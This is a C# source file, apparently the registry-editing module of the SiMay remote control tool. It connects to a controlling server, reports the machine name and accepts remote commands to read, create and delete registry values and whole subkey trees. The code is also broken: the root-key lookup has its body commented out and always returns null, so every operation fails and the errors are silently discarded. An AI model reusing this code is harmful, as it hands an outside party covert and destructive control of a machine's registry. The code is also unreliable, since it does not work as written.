using Microsoft.Win32;
using SiMay.Core;
using SiMay.Core.Extensions;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.Core.Packets.Reg;
using SiMay.ServiceCore.Attributes;
using SiMay.ServiceCore.Extensions;
using SiMay.ServiceCore.ServiceSource;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;
using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace SiMay.ServiceCore.ControlService
{
    [ServiceKey("RegEditManagerJob")]
    public class RegistyrService : ServiceManager, IServiceSource
    {
        private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
        public override void OnNotifyProc(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
        {
            switch (notify)
            {
                case TcpSocketCompletionNotify.OnConnected:
                    break;
                case TcpSocketCompletionNotify.OnSend:
                    break;
                case TcpSocketCompletionNotify.OnDataReceiveing:
                    break;
                case TcpSocketCompletionNotify.OnDataReceived:
                    this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
                    break;
                case TcpSocketCompletionNotify.OnClosed:
                    this._handlerBinder.Dispose();
                    break;
            }
        }

        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        public void InitializeComplete(TcpSocketSaeaSession session)
        {
            SendAsyncToServer(MessageHead.C_MAIN_ACTIVE_APP,
                new ActiveAppPack()
                {
                    IdentifyId = AppConfiguartion.IdentifyId,
                    ServiceKey = this.GetType().GetServiceKey(),
                    OriginName = Environment.MachineName + "@" + (AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo)
                });
        }

        [PacketHandler(MessageHead.S_GLOBAL_ONCLOSE)]
        public void CloseSession(TcpSocketSaeaSession session)
            => this.CloseSession();

        [PacketHandler(MessageHead.S_REG_CREATEVALUE)]
        public void TryCreateValue(TcpSocketSaeaSession session)
        {
            var newVlue = session.CompletedBuffer.GetMessageEntity<RegNewValuePack>();
            try
            {
                RegistryKey registryKey = GetRegistryRoot(newVlue.Root);
                registryKey = registryKey.OpenSubKey(newVlue.NodePath, true);
                registryKey.SetValue(newVlue.ValueName, newVlue.Value);

                var values = new List<RegValueItem>();
                foreach (var item in registryKey.GetValueNames())
                {
                    var valueItem = new RegValueItem()
                    {
                        ValueName = item
                    };

                    try
                    {
                        valueItem.Value = registryKey.GetValue(item).ToString();
                    }
                    catch
                    {
                        valueItem.Value = "";
                    }
                    values.Add(valueItem);
                }
                SendAsyncToServer(MessageHead.C_REG_VALUENAMES,
                    new RegValuesPack()
                    {
                        Values = values.ToArray()
                    });
                registryKey.Close();
            }
            catch { }
        }

        [PacketHandler(MessageHead.S_REG_DELETEVALUE)]
        public void TryDeleteValue(TcpSocketSaeaSession session)
        {
            var delValue = session.CompletedBuffer.GetMessageEntity<RegDeleteValuePack>();
            try
            {
                RegistryKey registryKey = GetRegistryRoot(delValue.Root);
                //                     SAM\123           "123"
                registryKey
                    .OpenSubKey(delValue.NodePath, true)
                    .DeleteValue(delValue.ValueName);
                registryKey.Close();

                registryKey = GetRegistryRoot(delValue.Root).OpenSubKey(delValue.NodePath);

                var values = new List<RegValueItem>();
                foreach (var item in registryKey.GetValueNames())
                {
                    var valueItem = new RegValueItem()
                    {
                        ValueName = item
                    };

                    try
                    {
                        valueItem.Value = registryKey.GetValue(item).ToString();
                    }
                    catch
                    {
                        valueItem.Value = "";
                    }
                    values.Add(valueItem);
                }

                SendAsyncToServer(MessageHead.C_REG_VALUENAMES,
                    new RegValuesPack()
                    {
                        Values = values.ToArray()
                    });

            }
            catch { }
        }

        [PacketHandler(MessageHead.S_REG_CREATESUBKEY)]
        public void TryCreateSubKey(TcpSocketSaeaSession session)
        {
            var newSubKey = session.CompletedBuffer.GetMessageEntity<RegNewSubkeyPack>();
            try
            {
                RegistryKey registryKey = GetRegistryRoot(newSubKey.Root);
                registryKey.CreateSubKey(newSubKey.NodePath + "\\" + newSubKey.NewSubKeyName);
                registryKey.Close();

                SendAsyncToServer(MessageHead.C_REG_CREATESUBKEY_FINSH,
                    new RegOperFinshPack()
                    {
                        Result = true,
                        Value = newSubKey.NewSubKeyName
                    });
            }
            catch
            {
                SendAsyncToServer(MessageHead.C_REG_CREATESUBKEY_FINSH,
                    new RegOperFinshPack()
                    {
                        Result = false,
                        Value = newSubKey.NewSubKeyName
                    });
            }
        }

        [PacketHandler(MessageHead.S_REG_DELETESUBKEY)]
        public void TryDeleteSubKey(TcpSocketSaeaSession session)
        {
            var delSubkey = session.CompletedBuffer.GetMessageEntity<RegDeleteSubKeyPack>();
            try
            {
                RegistryKey registryKey = GetRegistryRoot(delSubkey.Root);
                registryKey.DeleteSubKeyTree(delSubkey.NodePath);
                registryKey.Close();

                SendAsyncToServer(MessageHead.C_REG_DELETESUBKEY_FINSH,
                    new RegOperFinshPack()
                    {
                        Result = true,
                        Value = delSubkey.NodePath
                    });
            }
            catch
            {
                SendAsyncToServer(MessageHead.C_REG_DELETESUBKEY_FINSH,
                    new RegOperFinshPack()
                    {
                        Result = false,
                        Value = delSubkey.NodePath
                    });
            }
        }

        [PacketHandler(MessageHead.S_REG_OPENSUBKEY)]
        public void TryOpenSubkeys(TcpSocketSaeaSession session)
        {
            var key = session.CompletedBuffer.GetMessageEntity<RegOpenSubKeyPack>();
            string root = key.Root;
            string path = key.NodePath;
            var subKeys = new RegSubKeyValuePack();
            try
            {
                RegistryKey registryKey = GetRegistryRoot(root).OpenSubKey(path);
                var values = new List<RegValueItem>();
                foreach (var item in registryKey.GetValueNames())
                {
                    var valueItem = new RegValueItem()
                    {
                        ValueName = item
                    };

                    try
                    {
                        valueItem.Value = registryKey.GetValue(item).ToString();
                    }
                    catch
                    {
                        valueItem.Value = "";
                    }
                    values.Add(valueItem);
                }

                subKeys.SubKeyNames = registryKey.GetSubKeyNames();
                subKeys.Values = values.ToArray();

                registryKey.Close();
            }
            catch { }

            SendAsyncToServer(MessageHead.C_REG_SUBKEYNAMES, subKeys);
        }
        [PacketHandler(MessageHead.S_REG_OPENDIRECTLY)]
        public void TryOpenRootDirectory(TcpSocketSaeaSession session)
        {
            string root = session.CompletedBuffer.GetMessagePayload().ToUnicodeString();
            try
            {
                RegistryKey registryKey = GetRegistryRoot(root);
                SendAsyncToServer(MessageHead.C_REG_ROOT_DIRSUBKEYNAMES,
                    new RegRootDirectorysPack()
                    {
                        RootDirectorys = registryKey.GetSubKeyNames()
                    });
                registryKey.Close();
            }
            catch { }
        }

        private RegistryKey GetRegistryRoot(string root)
        {
            RegistryKey Registrykey = null;
            //switch (root)
            //{
            //    case "HKEY-CLASS-ROOT":
            //        Registrykey = Registry.ClassesRoot;
            //        break;

            //    case "HKEY-CURRENT-USER":
            //        Registrykey = Registry.CurrentUser;
            //        break;

            //    case "HKEY-LOCAL-MACHINE":
            //        Registrykey = Registry.LocalMachine;
            //        break;

            //    case "HKEY-USER":
            //        Registrykey = Registry.Users;
            //        break;

            //    case "HKEY-CURRENT-CONFIG":
            //        Registrykey = Registry.CurrentConfig;
            //        break;
            //}

            return Registrykey;
        }
    }
}